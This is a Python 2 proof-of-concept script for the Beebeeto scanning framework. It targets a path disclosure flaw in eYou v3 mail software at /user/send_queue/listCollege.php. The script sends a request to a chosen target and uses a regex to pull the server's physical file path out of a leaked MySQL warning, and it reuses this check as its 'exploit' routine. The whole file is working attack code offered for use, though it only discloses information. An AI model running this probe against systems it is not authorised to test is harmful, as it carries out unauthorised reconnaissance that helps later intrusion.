#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0097',
            'name': 'eYou v3 /user/send_queue/listCollege.php 路径泄漏漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-10-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eYou',
            'vul_version': ['v3'],
            'type': 'Information Disclosure',
            'tag': ['eYou漏洞', '爆物理路径漏洞', '/listCollege.php', 'php'],
            'desc': 'N/A',
            'references': ['http://sebug.net/vuldb/ssvid-62693',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/user/send_queue/listCollege.php'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        res = re.compile(r'supplied argument is not a valid MySQL result resource in <b>(.*)</b> on line')
        match = res.findall(content)
        if match:
            if '<b>Warning</b>:' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())